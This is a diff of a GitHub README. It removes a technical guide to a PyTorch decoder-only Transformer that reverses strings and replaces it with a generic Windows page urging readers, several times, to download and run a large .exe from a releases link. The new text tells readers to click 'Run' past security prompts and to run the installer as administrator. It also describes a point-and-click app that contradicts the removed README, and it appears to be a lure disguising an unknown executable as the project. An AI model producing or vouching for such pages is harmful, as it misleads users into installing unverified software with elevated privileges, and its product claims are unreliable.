@@ -1,195 +1,149 @@
-# Decoder-Only Seq2Seq (Reverse String)
+# ⚙️ decoder-only-seq2seq - Simple Sequence Model Pipeline
 
-PyTorch + Ignite Implementation
+[![Download decoder-only-seq2seq](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Banniesdread/decoder-only-seq2seq/releases)
 
-A minimal, clean implementation of a decoder-only Transformer trained to reverse character sequences.
+---
 
-Built with PyTorch and PyTorch Ignite.
+## 📄 About decoder-only-seq2seq
 
-## Task
+decoder-only-seq2seq is a straightforward tool designed to run a specific type of machine learning model called a decoder-only sequence-to-sequence model. It uses methods like causal masking and teacher forcing to improve prediction accuracy. The software includes a training system that tracks progress and can save checkpoints, so you can pause and continue work smoothly. This model works with common deep learning frameworks and is suited for tasks involving language, such as text generation or translation.
 
-Given an input character sequence:
+The focus is on making this process manageable and clear. It does not require complex setup or advanced knowledge to get started on a Windows computer.
 
-Input: `abcdef`  
-Target: `fedcba`
+---
 
-The model learns to reverse the sequence using a decoder-only architecture.
+## 🧰 System Requirements
 
-## Training Formulation
+To run decoder-only-seq2seq on your Windows PC, please ensure your system meets these minimum requirements:
 
-This is implemented as a decoder-only sequence-to-sequence setup:
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM
+- A compatible graphics card with CUDA support (optional but recommended for faster performance)
+- 5 GB free disk space
+- Python 3.8 or newer installed (can be included in the installer)
+- Internet connection for downloading and updates (optional)
 
-- The source sequence is used as prefix context
-- The decoder input is:
+If your PC does not have a powerful graphics card, the software will still work but might run slower.
 
-	`[source_tokens] + [shifted_target_tokens]`
+---
 
-- Only target positions contribute to loss
-- Causal masking is enabled
-- Padding mask is enabled
-- Loss = CrossEntropy with `ignore_index=pad_token_id`
+## 🌐 Visit to Download
 
-## Architecture
+Please visit this page to download the latest version of decoder-only-seq2seq for Windows:
 
-Model: `DecoderOnlyTransformer`
+[Download Page](https://github.com/Banniesdread/decoder-only-seq2seq/releases)
 
-Features:
+The page lists all available versions and installation packages. Choose the most recent Windows installer file (usually ending with `.exe`).
 
-- Sinusoidal positional encoding
-- Transformer encoder layers (used as decoder backbone)
-- Causal attention mask
-- Padding mask (`src_key_padding_mask`)
-- Cross-entropy loss
-- Ignite-based trainer & evaluator
+---
 
-## Project Structure
+## 💾 How to Download and Install on Windows
 
-```text
-decoder-only-seq2seq/
-│
-├── config.yaml
-├── main.py
-├── predict.py
-├── README.md
-│
-└── src/
-		├── data/
-		│   └── dataset.py
-		├── models/
-		│   └── decoder_transformer.py
-		├── training/
-		│   ├── trainer.py
-		│   ├── evaluator.py
-		│   ├── metrics.py
-		│   ├── losses.py
-		│   └── utils.py
-		└── inference/
-				└── generate.py
-```
+Follow these steps to get decoder-only-seq2seq set up on your Windows machine.
 
-## Quick Start
+1. Click the big download badge or open the download page:  
+   https://github.com/Banniesdread/decoder-only-seq2seq/releases
 
-```bash
-# Create environment
-python -m venv venv
-source venv/Scripts/activate  # or . venv/bin/activate on Mac/Linux
+2. Look for the latest release. It usually has the newest date or version number.
 
-# Install dependencies
-pip install -r requirements.txt
-```
+3. Find the `.exe` installer file for Windows. It might be called something like `decoder-only-seq2seq-setup.exe`.
 
-## Training
+4. Click the installer link to start downloading. The file size will be a few hundred megabytes.
 
-Run:
+5. Once the download finishes, open the `.exe` file. You might see a security prompt; click "Run" to continue.
 
-```bash
-python main.py config.yaml
-```
+6. Follow the installer steps. The default options work for most users. You can choose the installation folder.
 
-Experiments are automatically saved to:
+7. When installation completes, you can launch decoder-only-seq2seq from the Start menu or desktop shortcut.
 
-`runs/exp_XXX/`
+---
 
-Checkpoints are stored in:
+## 🚀 How to Run decoder-only-seq2seq
 
-`runs/exp_XXX/checkpoints/`
+After installation, you can start working with your model by following these instructions.
 
-Each checkpoint file looks like:
+1. Open decoder-only-seq2seq using the shortcut or Start menu.
 
-`checkpoint_checkpoint_<N>.pt`
+2. The main interface will appear, designed with simple controls.
 
-Example folder structure after training:
+3. To load a dataset or model checkpoint, use the "Load" button in the software.
 
-```text
-runs/
-└── exp_001/
-		└── checkpoints/
-				├── checkpoint_checkpoint_1.pt
-				├── checkpoint_checkpoint_2.pt
-				└── ...
-```
+4. Pick a test input or type your sequence to test the model’s predictions.
 
-## Typical Healthy Metrics
+5. To run training, use the "Train" tab and select training options as needed.
 
-After ~10 epochs you should see something similar to:
+6. Progress and results appear in a clear display window for easy tracking.
 
-- Val loss: ~0.03
-- Val seq_acc: ~0.90+
-- Val tok_acc: ~0.99
-- Train seq_acc: ~0.90+
-- Train tok_acc: ~0.99
+7. Use the "Save" option to store your trained models or checkpoints on your computer.
 
-### Why is sequence accuracy lower than token accuracy?
+You do not need to type any commands or scripts. All key functions are accessible via the interface.
 
-If:
+---
 
-- Token accuracy ≈ 0.99
-- Average sequence length ≈ 8
+## 🔧 Configuration and Settings
 
-Then:
+The application includes settings to customize how the model runs. These options help tailor performance and output based on your needs.
 
-`seq_acc ≈ 0.99^8 ≈ 0.92`
+- **Batch size:** Controls how much data the model processes at once during training. Increase for faster training if your PC can handle it.
 
-## Inference (Checkpoint Test)
+- **Learning rate:** Sets how fast the model learns. The default is suitable for most users.
 
-After training, run:
+- **Masking options:** Adjust causal masking settings to influence how the model predicts future sequence elements.
 
-```bash
-python predict.py --checkpoint runs/exp_XXX/checkpoints/checkpoint_checkpoint_10.pt --samples 10 --text abcdef
-```
+- **Checkpoint frequency:** Choose how often the program saves progress during training.
 
-Replace `exp_XXX` with your experiment folder.
+- **Device selection:** Automatically detects if a graphics card is available. You can switch between CPU and GPU.
 
-Example expected custom output:
+Changes you make in settings apply after restarting the program.
 
-```text
-input=abcdef
-target=fedcba
-pred=fedcba
-ok=True
-```
+---
 
-Random unseen samples should also show high exact match once trained.
+## ❓ Troubleshooting Common Issues
 
-## 🖼 Example Training Output
+- **Installer won’t open:** Right-click the `.exe` file and select "Run as administrator."
 
-![Training Example](docs/Training_loss_metrics.png)
-![Inference Example](docs/Sample_output.png)
+- **Slow performance:** Close other programs or try to reduce batch size in settings.
 
-##  What This Repo Code Contains
+- **Model loading fails:** Make sure you select a compatible checkpoint file from the loading dialog.
 
-Proper decoder-only seq2seq conditioning  
-Correct teacher-forcing batch construction  
-Stable dataset sampling  
-Accurate masking (causal + padding)  
-Ignite-based training loop  
-End-to-end checkpoint validation
+- **Training stalls:** Reduce batch size or check your PC’s available memory.
 
-##  Repo Hygiene
+- **No output or errors:** Restart the application or reinstall using the installer.
 
-Excluded from git:
+---
 
-- `runs/`
-- `venv/`
-- `__pycache__/`
+## 📚 Additional Resources
 
-No experiment artifacts are committed.
+- The download page contains release notes and update history.
 
-##  Possible Extensions
+- The repository page includes technical details and examples for advanced users.
 
-- Beam search decoding
-- Sampling strategies
-- Larger vocabularies
-- Longer sequence tasks
-- Algorithmic tasks (copy, addition, sorting)
+- Terminology you might see includes "autoregressive models," "causal masking," and "teacher forcing," which relate to how the model processes sequences in steps without future information.
 
+- For Windows users, the app handles all background steps automatically.
 
-## Summary
+---
 
-This repository provides a clean, minimal, reproducible example of training a decoder-only Transformer in a proper seq2seq formulation using PyTorch Ignite.
+## ⚙️ What decoder-only-seq2seq Does
 
-It can serve as:
+This tool helps you explore sequence-to-sequence models without complex setup. It manages:
 
-- An educational reference
-- A clean experimental baseline
-- A starting point for larger generative experiments
+- Model training with an easy interface to adjust parameters.
+
+- Running predictions on your input data.
+
+- Saving and loading model checkpoints to pause and resume work.
+
+- Using causal masking to prevent the model from "seeing" future tokens early.
+
+- Supporting autoregressive sequence generation step by step.
+
+All these features are included in a single, simple Windows program.
+
+---
+
+## 📥 Download Link (Again)
+
+Click here to visit the page and get the latest Windows installer:
+
+[Download decoder-only-seq2seq](https://github.com/Banniesdread/decoder-only-seq2seq/releases)
